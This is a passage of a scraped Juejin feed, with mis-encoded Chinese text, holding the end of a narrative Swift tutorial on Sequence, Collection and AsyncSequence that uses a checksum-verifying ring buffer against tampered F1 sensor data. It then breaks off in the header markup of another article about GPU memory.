    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> lock <span class="hljs-operator">=</span> <span class="hljs-type">NSLock</span>()

    <span class="hljs-comment">// å…¥é˜Ÿæ—¶æ ¡éªŒï¼šç¯¡æ”¹çš„æ•°æ®ç›´æ¥æ‹’ä¹‹é—¨å¤–</span>
    <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">enqueue</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">element</span>: <span class="hljs-type">Element</span>) <span class="hljs-keyword">throws</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-comment">// å…³é”®ï¼šéªŒè¯æ•°æ®å“ˆå¸Œå€¼ï¼Œä¸åŒ¹é…åˆ™æŠ›å‡ºâ€œæ•°æ®ç¯¡æ”¹é”™è¯¯â€</span>
        <span class="hljs-keyword">guard</span> element.verifyChecksum() <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(
                <span class="hljs-string">"æ•°æ®æ ¡éªŒå¤±è´¥ï¼ŒIDï¼š<span class="hljs-subst">\(element.id)</span>ï¼Œå¯èƒ½è¢«ç¯¡æ”¹"</span>
            )
        }

        storage[tail] <span class="hljs-operator">=</span> element
        tail <span class="hljs-operator">=</span> (tail <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count

        <span class="hljs-keyword">if</span> count <span class="hljs-operator">==</span> storage.count {
            head <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count
        } <span class="hljs-keyword">else</span> {
            count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
        }
    }

    <span class="hljs-comment">// ä¸‹æ ‡è®¿é—®æ—¶äºŒæ¬¡æ ¡éªŒï¼šé˜²æ­¢ç¼“å†²åŒºå†…éƒ¨æ•°æ®è¢«ç¯¡æ”¹</span>
    <span class="hljs-keyword">subscript</span>(<span class="hljs-params">position</span>: <span class="hljs-type">Index</span>) -&gt; <span class="hljs-type">Element</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-built_in">precondition</span>((<span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>count).contains(position), <span class="hljs-string">"ç´¢å¼•è¶…å‡ºèŒƒå›´"</span>)
        <span class="hljs-keyword">let</span> actualPosition <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> position) <span class="hljs-operator">%</span> storage.count
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> element <span class="hljs-operator">=</span> storage[actualPosition] <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">preconditionFailure</span>(<span class="hljs-string">"ç¼“å†²åŒºæ•°æ®ä¸¢å¤±ï¼Œä½ç½®ï¼š<span class="hljs-subst">\(actualPosition)</span>"</span>)
        }

        <span class="hljs-comment">// äºŒæ¬¡æ ¡éªŒï¼šç¡®ä¿æ•°æ®åœ¨ç¼“å†²åŒºä¸­æ²¡è¢«ç¯¡æ”¹</span>
        <span class="hljs-built_in">precondition</span>(element.verifyChecksum(), <span class="hljs-string">"ç¼“å†²åŒºæ•°æ®è¢«ç¯¡æ”¹ï¼ŒIDï¼š<span class="hljs-subst">\(element.id)</span>"</span>)
        <span class="hljs-keyword">return</span> element
    }
}

<span class="hljs-comment">// æ•°æ®æ ¡éªŒåè®®ï¼šæ‰€æœ‰éœ€è¦æ ¡éªŒçš„æ•°æ®éƒ½è¦éµå®ˆ</span>
<span class="hljs-keyword">protocol</span> <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">var</span> id: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// å”¯ä¸€ID</span>
    <span class="hljs-keyword">var</span> checksum: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// æ•°æ®å“ˆå¸Œå€¼</span>
    <span class="hljs-comment">// æ ¡éªŒæ–¹æ³•ï¼šè®¡ç®—å½“å‰æ•°æ®çš„å“ˆå¸Œå€¼ï¼Œå’Œè‡ªå¸¦çš„checksumå¯¹æ¯”</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span>
}

<span class="hljs-comment">// ä¼ æ„Ÿå™¨æ•°æ®å®ç°æ ¡éªŒåè®®</span>
<span class="hljs-keyword">extension</span> <span class="hljs-title class_">SensorData</span>: <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// è®¡ç®—â€œå†…å®¹+æ—¶é—´æˆ³â€çš„MD5å“ˆå¸Œå€¼ï¼ˆçœŸå®é¡¹ç›®ä¸­å»ºè®®ç”¨æ›´å®‰å…¨çš„SHA256ï¼‰</span>
        <span class="hljs-keyword">let</span> calculatedChecksum <span class="hljs-operator">=</span> <span class="hljs-string">"<span class="hljs-subst">\(content)</span>-<span class="hljs-subst">\(timestamp)</span>"</span>.md5()
        <span class="hljs-keyword">return</span> calculatedChecksum <span class="hljs-operator">==</span> <span class="hljs-keyword">self</span>.checksum
    }
}

<span class="hljs-comment">// è‡ªå®šä¹‰é”™è¯¯ï¼šæ•°æ®ç¯¡æ”¹é”™è¯¯</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataTamperingError</span>: <span class="hljs-title class_">Error</span> {
    <span class="hljs-keyword">case</span> invalidChecksum(<span class="hljs-type">String</span>)
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe4917dea20e4c8fa13e96c614e01bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=hKXMib4yBDm175yMkDcpXI8OR%2Bg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-7">æ•ˆæœï¼šâ€œè¿­ä»£å¼‚å¸¸å…½â€ çš„ç¯¡æ”¹å½»åº•å¤±æ•ˆ</h3>
<p>å½“ â€œè¿­ä»£å¼‚å¸¸å…½â€ è¯•å›¾æŠŠç¯¡æ”¹åçš„ä¼ æ„Ÿå™¨æ•°æ®ï¼ˆæ ¡éªŒç ä¸åŒ¹é…ï¼‰å…¥é˜Ÿæ—¶ï¼Œ<code>enqueue</code>ä¼šç›´æ¥æŠ›å‡º<code>DataTamperingError</code>ï¼Œé”™è¯¯æ•°æ®è¿ç¼“å†²åŒºçš„é—¨éƒ½è¿›ä¸äº†ï¼›å°±ç®—å®ƒæƒ³å·å·ä¿®æ”¹ç¼“å†²åŒºé‡Œçš„æ•°æ®ï¼Œ<code>subscript</code>è®¿é—®æ—¶çš„äºŒæ¬¡æ ¡éªŒä¹Ÿä¼šè§¦å‘<code>preconditionFailure</code>ï¼Œç«‹åˆ»æš´éœ²é—®é¢˜ã€‚</p>
<p>è‰¾æ‹‰æµ‹è¯•æ—¶æ•…æ„æ³¨å…¥ä¸€æ¡ç¯¡æ”¹æ•°æ®ï¼Œç³»ç»Ÿç¬é—´å¼¹å‡ºè­¦å‘Šï¼šâ€œDataTamperingErrorï¼šæ•°æ®æ ¡éªŒå¤±è´¥ï¼ŒIDï¼šsensor_123ï¼Œå¯èƒ½è¢«ç¯¡æ”¹â€â€”â€” å°±åƒèµ›è½¦çš„é˜²ç›—ç³»ç»Ÿæ£€æµ‹åˆ°éæ³•å…¥ä¾µï¼Œç«‹åˆ»é”æ­»å¼•æ“ï¼Œè®© â€œå°å·â€ æ— ä»ä¸‹æ‰‹ã€‚</p>
<h2 data-id="heading-8">ğŸ† ç»ˆå±€ï¼šç»„åˆæ‹³ç²‰ç¢ â€œè¿­ä»£å¼‚å¸¸å…½â€</h2>
<p>è§£å†³äº†é”™è¯¯æ¢å¤å’Œæ•°æ®ç¯¡æ”¹ï¼Œè‰¾æ‹‰å’Œæ°è¥¿æ‰“å‡ºæœ€åä¸€å¥— â€œç»„åˆæ‹³â€ï¼šç”¨<code>RetryableSensorSequence</code>å¤„ç†å¼‚æ­¥é”™è¯¯ï¼Œç”¨<code>SafeRingBuffer</code>åšæ•°æ®ç¼“å­˜å’Œæ ¡éªŒï¼Œå†é…åˆä¸€ä¸ª â€œç›‘æ§ Taskâ€ å®æ—¶ç›‘æ§åºåˆ—çŠ¶æ€ â€”â€” ä¸‰è€…è”åŠ¨ï¼Œå½¢æˆæ— æ­»è§’çš„é˜²å¾¡ç½‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f42b5ca1a5147fa8687af3fd9bb4c89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=gLcjcdWAZaJ%2Bu9oftzKuUJd7c1w%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-9">å®Œæ•´æµç¨‹ä»£ç ï¼ˆç»ˆå±€æ–¹æ¡ˆï¼‰</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. åˆ›å»ºå¸¦æ ¡éªŒçš„ç¯å½¢ç¼“å†²åŒºï¼ˆå®¹é‡10ï¼Œåªå­˜åˆæ³•æ•°æ®ï¼‰</span>
<span class="hljs-keyword">var</span> verifiedBuffer <span class="hljs-operator">=</span> <span class="hljs-type">SafeRingBuffer</span>&lt;<span class="hljs-type">SensorData</span>&gt;(capacity: <span class="hljs-number">10</span>)

<span class="hljs-comment">// 2. åˆ›å»ºå¯é‡è¯•çš„ä¼ æ„Ÿå™¨åºåˆ—ï¼ˆé˜²æ–­è¿ã€é˜²é‡å¤ï¼‰</span>
<span class="hljs-keyword">let</span> sensorSequence <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>()
<span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: sensorSequence)

<span class="hljs-comment">// 3. ä¸»Taskï¼šæ¶ˆè´¹åºåˆ—ï¼Œå­˜å…¥ç¼“å†²åŒº</span>
<span class="hljs-keyword">let</span> mainTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">try</span> verifiedBuffer.enqueue(data)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"æˆåŠŸå…¥é˜Ÿï¼šID=<span class="hljs-subst">\(data.id)</span>ï¼Œè½¬é€Ÿ=<span class="hljs-subst">\(data.engineRPM)</span>è½¬"</span>)
                <span class="hljs-comment">// å®æ—¶æ›´æ–°ä»ªè¡¨ç›˜ï¼ˆåªä¼ åˆæ³•æ•°æ®ï¼‰</span>
                <span class="hljs-keyword">await</span> dashboard.update(with: verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>])
            } <span class="hljs-keyword">catch</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(<span class="hljs-keyword">let</span> message) {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‹¦æˆªç¯¡æ”¹æ•°æ®ï¼š<span class="hljs-subst">\(message)</span>"</span>)
                <span class="hljs-comment">// è§¦å‘è­¦æŠ¥ï¼Œè®°å½•æ—¥å¿—</span>
                <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.high, message: message)
            }
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿­ä»£ç»ˆæ­¢ï¼š<span class="hljs-subst">\(error)</span>"</span>)
        <span class="hljs-comment">// é‡è¯•å¤±è´¥ï¼Œåˆ‡æ¢åˆ°å¤‡ç”¨ä¼ æ„Ÿå™¨</span>
        <span class="hljs-keyword">await</span> switchToBackupSensor()
    }
}

<span class="hljs-comment">// 4. ç›‘æ§Taskï¼šå®æ—¶æ£€æŸ¥ç¼“å†²åŒºçŠ¶æ€ï¼Œé˜²æ­¢å¼‚å¸¸</span>
<span class="hljs-keyword">let</span> monitorTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">while</span> <span class="hljs-operator">!</span><span class="hljs-type">Task</span>.isCancelled {
        <span class="hljs-keyword">guard</span> verifiedBuffer.count <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"è­¦å‘Šï¼šç¼“å†²åŒºä¸ºç©ºï¼Œå¯èƒ½ä¼ æ„Ÿå™¨æ— æ•°æ®"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.low, message: <span class="hljs-string">"ç¼“å†²åŒºç©º"</span>)
            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
            <span class="hljs-keyword">continue</span>
        }
        <span class="hljs-comment">// æ¯1ç§’æ£€æŸ¥ä¸€æ¬¡æœ€æ–°æ•°æ®çš„æ—¶æ•ˆæ€§ï¼ˆé˜²æ­¢æ•°æ®è¿‡æœŸï¼‰</span>
        <span class="hljs-keyword">let</span> latestData <span class="hljs-operator">=</span> verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>]
        <span class="hljs-keyword">if</span> <span class="hljs-type">Date</span>().timeIntervalSince(latestData.timestamp) <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"è­¦å‘Šï¼šæœ€æ–°æ•°æ®å·²è¿‡æœŸï¼Œå¯èƒ½åºåˆ—å¡é¡¿"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.medium, message: <span class="hljs-string">"æ•°æ®è¿‡æœŸ"</span>)
        }
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
    }
}
</code></pre>
<h3 data-id="heading-10">å‰§æƒ…æ”¶å°¾ï¼šèµ›é“æ¢å¤å¹³é™ï¼Œè¿­ä»£çœŸç›¸æ­æ™“</h3>
<p>å½“è¿™å¥—ç»„åˆæ‹³éƒ¨ç½²å®Œæˆåï¼Œèµ›è½¦ä»ªè¡¨ç›˜çš„è½¬é€Ÿæ•°æ®ç¬é—´ç¨³å®šä¸‹æ¥ â€”â€”10000 è½¬ã€10020 è½¬ã€9980 è½¬ï¼Œæ¯ä¸€ä¸ªæ•°å­—éƒ½ç²¾å‡†è·³åŠ¨ï¼Œæ§åˆ¶å®¤çš„è­¦æŠ¥å£°æ¸æ¸å¹³æ¯ã€‚è‰¾æ‹‰çœ‹ç€å±å¹•ä¸Š â€œæ‰€æœ‰ä¼ æ„Ÿå™¨æ­£å¸¸â€ çš„ç»¿è‰²æç¤ºï¼Œé•¿èˆ’ä¸€å£æ°”ï¼šâ€œâ€˜è¿­ä»£å¼‚å¸¸å…½â€™è¢«æ‰“è·‘äº†ï¼Ÿâ€</p>
<p>æ°è¥¿ç¬‘ç€ç‚¹å¼€æ—¥å¿—ï¼Œé‡Œé¢å…¨æ˜¯ â€œæ‹¦æˆªç¯¡æ”¹æ•°æ®â€â€œé‡è¯•æˆåŠŸâ€ çš„è®°å½•ï¼šâ€œä¸æ˜¯æ‰“è·‘ï¼Œæ˜¯å®ƒå†ä¹Ÿæ²¡æ³•é’»æ¼æ´äº†ã€‚ä½ çœ‹ â€”â€”AsyncSequence çš„æ ¸å¿ƒæ˜¯â€˜é”™è¯¯å¯æ§â€™ï¼ŒCollection çš„æ ¸å¿ƒæ˜¯â€˜æ•°æ®å¯ä¿¡â€™ï¼Œè¿­ä»£å™¨çš„æ ¸å¿ƒæ˜¯â€˜çŠ¶æ€ç‹¬ç«‹â€™ï¼Œåªè¦å®ˆä½è¿™ä¸‰ä¸ªæ ¸å¿ƒï¼Œå†ç‹¡çŒ¾çš„é—®é¢˜ä¹Ÿèƒ½è§£å†³ã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f87bd5000834169ad41c9bbd7cc0ae0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=l42wJ%2B39GjJSTLwxqVty%2FtuoEqk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>çªç„¶ï¼Œä»ªè¡¨ç›˜å¼¹å‡ºä¸€æ¡æ–°æ¶ˆæ¯ï¼šâ€œæ£€æµ‹åˆ°å¤–éƒ¨å¹²æ‰°æºå·²æ–­å¼€è¿æ¥â€â€”â€”â€œè¿­ä»£å¼‚å¸¸å…½â€ å½»åº•æ¶ˆå¤±äº†ã€‚</p>
<p>èµ›é“ä¸Šï¼ŒF1 èµ›è½¦é‡æ–°åŠ é€Ÿï¼Œå¼•æ“çš„è½°é¸£å£°å†æ¬¡å˜å¾—å‡åŒ€æœ‰åŠ›ï¼›å±å¹•å‰ï¼Œè‰¾æ‹‰å’Œæ°è¥¿ç›¸è§†ä¸€ç¬‘ï¼Œä»–ä»¬ä¸ä»…ä¿®å¤äº†ç³»ç»Ÿï¼Œæ›´æ‘¸æ¸…äº† Swift è¿­ä»£çš„ â€œåº•å±‚é€»è¾‘â€ã€‚</p>
<h2 data-id="heading-11">ğŸ“ ç»ˆææ€»ç»“ï¼šSwift è¿­ä»£çš„ â€œé»„é‡‘æ³•åˆ™â€</h2>
<ol>
<li><strong>Sequence æ˜¯ â€œå…¥é—¨å¥‘çº¦â€</strong>ï¼šåªæ‰¿è¯º â€œèƒ½è¿­ä»£ä¸€æ¬¡â€ï¼Œé€‚åˆæ‡’åŠ è½½ã€ç”Ÿæˆå™¨åœºæ™¯ï¼Œåƒ F1 çš„ â€œç»ƒä¹ èµ›â€â€”â€” çµæ´»ä½†ä¸è¿½æ±‚ç¨³å®šã€‚</li>
<li><strong>Collection æ˜¯ â€œè¿›é˜¶å¥‘çº¦â€</strong>ï¼šå¤šè½®è¿­ä»£ã€ç´¢å¼•è®¿é—®ã€æ•°æ®ç¨³å®šï¼Œé€‚åˆéœ€è¦åå¤æ“ä½œçš„æ•°æ®ï¼Œåƒ F1 çš„ â€œæ­£èµ›â€â€”â€” ç¨³å®šä¸”é«˜æ•ˆã€‚</li>
<li><strong>AsyncSequence æ˜¯ â€œå¼‚æ­¥å¥‘çº¦â€</strong>ï¼šæ”¯æŒæš‚åœã€æŠ›é”™ï¼Œé€‚åˆæ•°æ®æµåœºæ™¯ï¼Œä½†è¦æ³¨æ„ â€œé”™è¯¯ç»ˆæ­¢æ€§â€ å’Œ â€œé‡è¯•é˜²é‡å¤â€ï¼Œåƒ F1 çš„ â€œå¤œé—´èµ›â€â€”â€” æ›´å¤æ‚ï¼Œä½†æœ‰ä¸“å±çš„åº”å¯¹ç­–ç•¥ã€‚</li>
<li><strong>è¿­ä»£å™¨çš„ â€œå€¼è¯­ä¹‰ä¼˜å…ˆâ€</strong>ï¼šå°½é‡ç”¨ struct å®ç°è¿­ä»£å™¨ï¼Œé¿å…å…±äº«å¯å˜çŠ¶æ€ï¼Œå°±åƒèµ›è½¦çš„ â€œç‹¬ç«‹æ“æ§ç³»ç»Ÿâ€â€”â€” äº’ä¸å¹²æ‰°ï¼Œå®‰å…¨å¯æ§ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc043a15ff8d4f1ba564566f02ea4d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=BmhYXOVWjyb2nknjqfaZUY6AMOk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æœ€åè®°ä½ï¼šSwift çš„è¿­ä»£çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™æ˜¯ â€œåè®®é©±åŠ¨â€ çš„ç²¾å¦™è®¾è®¡ã€‚å½“ä½ å†™ä¸‹<code>for item in list</code>æ—¶ï¼ŒèƒŒåæ˜¯ Sequenceã€Collectionã€Iterator çš„ååŒä½œæˆ˜ â€”â€” å°±åƒ F1 èµ›è½¦çš„å¼•æ“ã€åˆ¹è½¦ã€åº•ç›˜å®Œç¾é…åˆï¼Œæ‰èƒ½è·‘å‡ºæœ€å¿«çš„é€Ÿåº¦ï¼Œä¹Ÿæ‰èƒ½å†™å‡ºæœ€ç¨³å®šã€æœ€é«˜æ•ˆçš„ä»£ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/253bf7fec4ec44e8b1e3c8452905d398~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=8kSe9U2VE3lF6L6xAMXbkZLhv2o%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>é‚£ä¹ˆï¼Œå®å­ä»¬çœ‹åˆ°è¿™é‡Œå­¦åˆ°äº†å—ï¼Ÿ</p>
<p>æ„Ÿè°¢è§‚èµï¼Œä¸‹æ¬¡æˆ‘ä»¬å†ä¼šå§ï¼8-)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ¨¡å‹å äº† 10G æ˜¾å­˜ï¼ŒæœåŠ¡é‡å¯å´æ²¡é‡Šæ”¾ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581765536372064265</link>    <guid>https://juejin.cn/post/7581765536372064265</guid>    <pubDate>2025-12-10T01:56:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372064265" data-draft-id="7581765536371965961" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ¨¡å‹å äº† 10G æ˜¾å­˜ï¼ŒæœåŠ¡é‡å¯å´æ²¡é‡Šæ”¾ï¼Ÿ"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,åç«¯"/> <meta itemprop="datePublished" content="2025-12-10T01:56:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lomocode"/> <meta itemprop="url" content="https://juejin.cn/user/2103792315926697"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ¨¡å‹å äº† 10G æ˜¾å­˜ï¼ŒæœåŠ¡é‡å¯å´æ²¡é‡Šæ”¾ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2103792315926697/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lomocode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:56:23.000Z" title="Wed Dec 10 2025 01:56:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 